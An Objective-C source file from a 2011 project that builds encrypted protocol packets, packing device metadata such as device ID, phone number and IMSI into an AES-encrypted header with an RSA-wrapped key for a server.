//
//  ProtocolPacketBuilder.m
//  ProtocolBuilder
//
//  Created by Pichaya Srifar on 7/26/11.
//  Copyright 2011 Vervata. All rights reserved.
//

#import "ProtocolPacketBuilder.h"
#import "PayloadBuilder.h"
#import "CommandMetaData.h"
#import "LanguageEnum.h"
#import "EncryptionTypeEnum.h"
#import "RSACryptor.h"
#import "PayloadBuilderResponse.h"
#import "CRC32.h"
#import "AESCryptor.h"

@implementation ProtocolPacketBuilder

@synthesize aesKey;

- (ProtocolPacketBuilderResponse *)buildPacketForCommand:(id<CommandData>)command 
											withMetaData:(CommandMetaData *)metadata 
										 withPayloadPath:(NSString *)payloadPath
										   withPublicKey:(NSData *)publicKey
												withSSID:(unsigned int)SSID
										   withDirective:(TransportDirective)directive {
	// 1. build payload
	// 2. build metadata
	// 3. tell executor
	// 4. executor tell http
	if(!command) {
		return nil;
	}
	DLog(@"ENTER 1 %@", command);
	PayloadBuilder *payloadBuilder = [[PayloadBuilder alloc] init];
	PayloadBuilderResponse *payloadResponse = [payloadBuilder BuildPayloadForCmd:command
											withMetaData:metadata
										withPayloadPath:payloadPath
										   withDirective:directive];
	[self setAesKey:[payloadResponse aesKey]];
	[payloadBuilder release];
	
	[metadata setPayloadSize:[payloadResponse payloadSize]];
	[metadata setPayloadCRC32:[payloadResponse payloadCRC32]];
	
	NSData *header = [self buildMetaData:metadata
					withPublicKey:publicKey
							  withAESKey:[payloadResponse aesKey]
						withSSID:SSID
					withDirective:directive];

	ProtocolPacketBuilderResponse *result = [[ProtocolPacketBuilderResponse alloc] init];
	[result setAesKey:[payloadResponse aesKey]];
	[result setMetaDataWithHeader:header];
	
	// SHOULD REFINE 
	// why payload size, payload crc32 are in 2 places, metadata & result
	
	[result setPayloadData:[payloadResponse data]];
	[result setPayloadSize:[payloadResponse payloadSize]];
	[result setPayloadCRC32:[payloadResponse payloadCRC32]];
	
	return [result autorelease];
}

- (NSData *)buildMetaData:(CommandMetaData *)metadata 
			withPublicKey:(NSData *)publicKey 
			   withAESKey:(NSString *)aAESKey
				 withSSID:(unsigned int)SSID 
			withDirective:(TransportDirective)directive {
	// start from request data
	uint16_t protocolVersion = [metadata protocolVersion];
	protocolVersion = htons(protocolVersion);
	uint16_t productID = [metadata productID];
	productID = htons(productID);
	NSString *productVersion = [metadata productVersion];
	uint8_t productVersionLength = [productVersion lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	uint16_t configID = [metadata confID];
	configID = htons(configID);
	NSString *deviceID = [metadata deviceID];
	uint8_t deviceIDLength = [deviceID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *activationCode = [metadata activationCode];
	uint8_t activationCodeLength = [activationCode lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	uint8_t language = [metadata language];
	NSString *phoneNumber = [metadata phoneNumber];
	uint8_t phoneNumberLength = [phoneNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *MCC = [metadata MCC];
	uint8_t MCCLength = [MCC lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *MNC = [metadata MNC];
	uint8_t MNCLength = [MNC lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *IMSI = [metadata IMSI];
	uint8_t IMSILength = [IMSI lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	NSString *hostURL = [metadata hostURL];
	uint8_t hostURLLength = [hostURL lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
	uint8_t transportDirective = directive;
	uint8_t encryptionCode = [metadata encryptionCode];
	uint8_t compressionCode = [metadata compressionCode];
	uint32_t payloadSize = [metadata payloadSize];
	uint32_t payloadCRC32 = [metadata payloadCRC32];
	payloadSize = htonl(payloadSize);
	payloadCRC32 = htonl(payloadCRC32);

	NSMutableData *requestData = [NSMutableData data];
	[requestData appendBytes:&protocolVersion length:sizeof(protocolVersion)];
	[requestData appendBytes:&productID length:sizeof(productID)];
	[requestData appendBytes:&productVersionLength length:sizeof(productVersionLength)];
	[requestData appendData:[productVersion dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&configID length:sizeof(configID)];

	[requestData appendBytes:&deviceIDLength length:sizeof(deviceIDLength)];
	[requestData appendData:[deviceID dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&activationCodeLength length:sizeof(activationCodeLength)];
	[requestData appendData:[activationCode dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&language length:sizeof(language)];
	[requestData appendBytes:&phoneNumberLength length:sizeof(phoneNumberLength)];
	[requestData appendData:[phoneNumber dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&MCCLength length:sizeof(MCCLength)];
	[requestData appendData:[MCC dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&MNCLength length:sizeof(MNCLength)];
	[requestData appendData:[MNC dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&IMSILength length:sizeof(IMSILength)];
	[requestData appendData:[IMSI dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&hostURLLength length:sizeof(hostURLLength)];
	[requestData appendData:[hostURL dataUsingEncoding:NSUTF8StringEncoding]];
	[requestData appendBytes:&transportDirective length:sizeof(transportDirective)];
	[requestData appendBytes:&encryptionCode length:sizeof(encryptionCode)];
	[requestData appendBytes:&compressionCode length:sizeof(compressionCode)];
	[requestData appendBytes:&payloadSize length:sizeof(payloadSize)];
	[requestData appendBytes:&payloadCRC32 length:sizeof(payloadCRC32)];

	//DLog(@"transportDirective %d", transportDirective);
	//DLog(@"before encrypt header %@", requestData);
	//DLog(@"aes %@", aAESKey);
	AESCryptor *aesCryptor = [[AESCryptor alloc] init];
	NSData * encryptedHeader = [aesCryptor encrypt:requestData withKey:aAESKey];
	//DLog("encrypted header = %@", encryptedHeader);
	[aesCryptor release];

	 // header of header
	uint8_t encryptionType = ENCRYPT_METADATA;
	uint32_t networkSSID = htonl(SSID);

	RSACryptor *cryptor = [[RSACryptor alloc] init];
	NSData *encryptedAESKey = [cryptor encrypt:[aAESKey dataUsingEncoding:NSUTF8StringEncoding]
						   withServerPublicKey:publicKey];
	[cryptor release];
	uint16_t encryptedAESKeyLength = [encryptedAESKey length];
	//DLog(@"aes len %u", encryptedAESKeyLength);

	encryptedAESKeyLength = htons(encryptedAESKeyLength);
	uint16_t requestLength = [encryptedHeader length];
	requestLength = htons(requestLength);
	uint32_t requestCRC32 = [CRC32 crc32:encryptedHeader];
	//DLog(@"crc32 1 %d", requestCRC32);
	requestCRC32 = htonl(requestCRC32);
	//DLog(@"crc32 2 %d", requestCRC32);

	NSMutableData *headerOfHeader = [NSMutableData data];
	[headerOfHeader appendBytes:&encryptionType length:sizeof(encryptionType)];
	[headerOfHeader appendBytes:&networkSSID length:sizeof(networkSSID)];
	[headerOfHeader appendBytes:&encryptedAESKeyLength length:sizeof(encryptedAESKeyLength)];
	[headerOfHeader appendData:encryptedAESKey];
	[headerOfHeader appendBytes:&requestLength length:sizeof(requestLength)];
	[headerOfHeader appendBytes:&requestCRC32 length:sizeof(requestCRC32)];

	// combine
	[headerOfHeader appendData:encryptedHeader];
	//DLog(@"headerofheader + header: %@", headerOfHeader);
	return headerOfHeader;
}

- (ProtocolPacketBuilderResponse *) buildRAskPacketWithMetaData:(CommandMetaData *)aMetaData 
													   withSSID:(unsigned int)aSSID 
													 withAESKey:(NSString *)aAESKey
												  withPublicKey:(NSData *)aPublicKey
												withPayloadSize:(NSInteger)aPayloadSize
											   withPayloadCRC32:(NSInteger)aPayloadCRC32 {

	NSData *header = [self buildMetaData:aMetaData
						   withPublicKey:aPublicKey
							  withAESKey:aAESKey
								withSSID:aSSID
						   withDirective:RASK];

	ProtocolPacketBuilderResponse *result = [[ProtocolPacketBuilderResponse alloc] init];
	[result setMetaDataWithHeader:header];
	return [result autorelease];
}

- (ProtocolPacketBuilderResponse *) buildResumePacketData : (CommandMetaData *)aMetaData
										  withPayloadPath:(NSString *)aPayloadPath
											withPublicKey:(NSData *)aPublicKey
											   withAESKey:(NSString *)aAESKey
												 withSSID:(NSInteger)aSSID
											withDirective:(NSInteger)aDirective
										  withPayloadSize:(NSInteger)aPayloadSize
										 withPayloadCRC32:(NSInteger)aPayloadCRC32 {

	//[self setAesKey:aAESKey];
	//DLog(@"P Size %d", [aMetaData payloadSize]);
	//DLog(@"P CRC32 %d", [aMetaData payloadCRC32]);
	NSData *header = [self buildMetaData:aMetaData
						   withPublicKey:aPublicKey
							  withAESKey:aAESKey
								withSSID:aSSID
						   withDirective:aDirective];

	ProtocolPacketBuilderResponse *result = [[ProtocolPacketBuilderResponse alloc] init];
	[result setMetaDataWithHeader:header];
	[result setPayloadType:FROM_FILE];
	
	return [result autorelease];
}

- (void) dealloc {
	[aesKey release];
	[super dealloc];
}

@end
